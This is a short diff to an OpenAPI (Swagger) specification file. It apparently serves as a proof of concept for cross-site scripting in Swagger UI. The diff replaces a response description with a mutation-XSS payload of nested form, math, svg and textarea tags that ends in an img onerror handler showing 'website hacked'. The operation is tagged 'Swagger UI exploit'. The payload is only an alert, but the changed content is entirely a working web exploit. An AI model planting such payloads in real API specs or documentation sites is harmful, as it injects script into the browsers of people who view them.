@@ -52,7 +52,8 @@ paths:
         type: integer
       responses:
         '200':
-          description: No response was specified
+          description: |
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("website hacked") src=1>"></form>
       tags:
       - Swagger UI exploit
       operationId: some_operation
